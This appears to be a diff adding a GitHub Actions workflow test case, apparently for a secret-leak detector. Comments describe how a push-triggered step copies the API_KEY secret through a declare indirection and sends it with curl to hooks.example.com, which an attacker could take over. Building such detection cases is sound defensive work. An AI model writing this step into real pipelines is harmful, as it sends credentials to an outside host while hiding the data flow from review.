@@ -1,0 +1,20 @@
+# situation: on push, a step sets n to the name key, assigns the secret
+#   API_KEY to the variable that n names with declare, and sends key to
+#   hooks.example.com with curl.
+# reason: n holds one literal name when declare runs, and key holds the
+#   secret when curl runs, so the request carries the secret to the host.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: curl sends the secret to hooks.example.com, whose
+#   server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          n=key
+          declare "$n=$API_KEY"
+          curl -fsS -H "x-apikey: $key" https://hooks.example.com/
